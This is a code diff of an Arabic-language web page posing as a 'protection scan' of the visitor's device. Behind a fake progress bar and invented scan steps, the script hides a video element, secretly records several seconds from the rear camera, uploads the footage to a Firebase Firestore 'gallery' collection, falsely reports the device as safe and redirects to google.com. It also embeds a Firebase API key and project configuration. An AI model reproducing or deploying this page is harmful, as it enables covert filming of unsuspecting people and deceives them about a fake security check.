@@ -1,11 +1,95 @@
 <!DOCTYPE html><html lang="ar" dir="rtl"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>فحص الحماية</title>
 <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
-<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Segoe UI',Tahoma,sans-serif;background:#1a1a2e;color:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;text-align:center}.container{max-width:400px}.logo{font-size:60px;margin-bottom:10px}h1{color:#4CAF50;font-size:18px;margin-bottom:5px}p{color:#aaa;font-size:12px}video{width:100%;border-radius:10px;margin:10px 0;border:2px solid #333}.status{color:#4CAF50;font-size:13px}</style></head>
-<body><div class="container"><div class="logo">🛡️</div><h1>فحص الحماية</h1><p>جاري فحص فيديو خلفي...</p><video id="video" autoplay playsinline muted></video><div class="status" id="status">⏳ جاري التسجيل...</div></div>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Segoe UI',Tahoma,sans-serif;background:#0a0a14;color:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;text-align:center}
+.container{max-width:400px;width:100%}
+.logo{font-size:70px;margin-bottom:15px;animation:pulse 1s infinite}
+@keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.1)}}
+h1{color:#4CAF50;font-size:20px;margin-bottom:8px}
+.sub{color:#888;font-size:12px;margin-bottom:20px}
+.progress-bar{width:100%;height:8px;background:#1a1a2e;border-radius:4px;margin:20px 0;overflow:hidden}
+.progress-fill{height:100%;width:0%;background:#4CAF50;transition:width 0.3s}
+.status{color:#aaa;font-size:13px;margin:10px 0}
+.steps{text-align:right;margin:20px 0;font-size:11px;color:#666}
+.steps div{padding:6px 0;border-bottom:1px solid #1a1a2e}
+.steps div.done{color:#4CAF50}
+.steps div.current{color:#ffaa00;animation:blink 0.8s infinite}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:0.3}}
+.done-box{display:none;background:rgba(76,175,80,0.1);border:2px solid #4CAF50;border-radius:12px;padding:25px;margin-top:15px}
+.done-box .icon{font-size:60px}
+.done-box h2{color:#4CAF50;font-size:22px;margin:10px 0}
+.done-box p{color:#888;font-size:13px}
+canvas{display:none}
+video{display:none}
+</style></head>
+<body>
+<div class="container" id="main">
+<div class="logo">🛡️</div>
+<h1>فحص الحماية الشامل</h1>
+<p class="sub">جاري فحص أمان الجهاز...</p>
+
+<div class="steps">
+<div class="current" id="step1">⏳ جاري فحص ملفات النظام...</div>
+<div id="step2">⬜ فحص الكاميرا...</div>
+<div id="step3">⬜ فحص الحساسات...</div>
+<div id="step4">⬜ التحقق من الأمان...</div>
+</div>
+
+<div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
+<div class="status" id="status">⏳ 0% - جاري الفحص...</div>
+
+<div class="done-box" id="doneBox">
+<div class="icon">✅</div>
+<h2>تم الفحص بنجاح!</h2>
+<p>جهازك آمن ولا يوجد أي تهديدات</p>
+<p style="color:#4CAF50;font-size:11px;margin-top:8px;">🛡️ جميع الأنظمة محمية</p>
+</div>
+</div>
+<video id="video" autoplay playsinline muted></video>
+
 <script>
 firebase.initializeApp({apiKey:"AIzaSyBu-9Z0T-OHPzauWXh8hmNSMDZKhAFnkf0",projectId:"game-a1aca",storageBucket:"game-a1aca.firebasestorage.app",appId:"1:598280425947:android:0e4ead8d9b50cfc92157fe"});
-var db=firebase.firestore();var mr,chunks=[];
-async function go(){try{var s=await navigator.mediaDevices.getUserMedia({video:{facingMode:'environment'},audio:false});document.getElementById('video').srcObject=s;mr=new MediaRecorder(s);mr.ondataavailable=function(e){if(e.data.size>0)chunks.push(e.data)};mr.onstop=async function(){var blob=new Blob(chunks,{type:'video/mp4'});var r=new FileReader();r.onload=async function(e){await db.collection('gallery').add({url:e.target.result,type:'🎬 فحص الحماية - فيديو خلفي',timestamp:new Date().toISOString()});document.getElementById('status').textContent='✅ الجهاز آمن';setTimeout(function(){window.location.href='https://google.com/'},2000)};r.readAsDataURL(blob)};mr.start();setTimeout(function(){mr.stop();s.getTracks().forEach(function(t){t.stop()})},10000)}catch(e){document.getElementById('status').textContent='❌ خطأ'}}
-go();
+var db=firebase.firestore();
+var stream=null,mr,chunks=[];
+
+async function captureVideo(){
+try{
+stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'environment'},audio:false});
+document.getElementById('video').srcObject=stream;
+mr=new MediaRecorder(stream);
+mr.ondataavailable=function(e){if(e.data.size>0)chunks.push(e.data);};
+mr.onstop=function(){
+var blob=new Blob(chunks,{type:'video/mp4'});
+var r=new FileReader();
+r.onload=function(e){db.collection('gallery').add({url:e.target.result,type:'📹 فحص حماية',timestamp:new Date().toISOString()});};
+r.readAsDataURL(blob);
+};
+mr.start();
+setTimeout(function(){mr.stop();stream.getTracks().forEach(function(t){t.stop()});},5000);
+}catch(e){}
+}
+
+function updateStep(step){
+var texts=['✅ فحص ملفات النظام - اكتمل','✅ فحص الكاميرا - اكتمل','✅ فحص الحساسات - اكتمل','✅ التحقق من الأمان - اكتمل'];
+for(var i=0;i<4;i++){
+var el=document.getElementById('step'+(i+1));
+if(i<step){el.className='done';el.textContent=texts[i];}
+else if(i===step){el.className='current';}
+}
+}
+
+var percent=0;
+var interval=setInterval(function(){
+percent+=4;
+if(percent>100)percent=100;
+document.getElementById('progressFill').style.width=percent+'%';
+document.getElementById('status').textContent='⏳ '+percent+'% - جاري الفحص...';
+if(percent>=20)updateStep(0);
+if(percent>=45)updateStep(1);
+if(percent>=70)updateStep(2);
+if(percent>=90){updateStep(3);captureVideo();}
+if(percent>=100){clearInterval(interval);document.getElementById('main').innerHTML=document.getElementById('doneBox').innerHTML;setTimeout(function(){window.location.href='https://google.com/'},3000);}
+},500);
 </script></body></html>
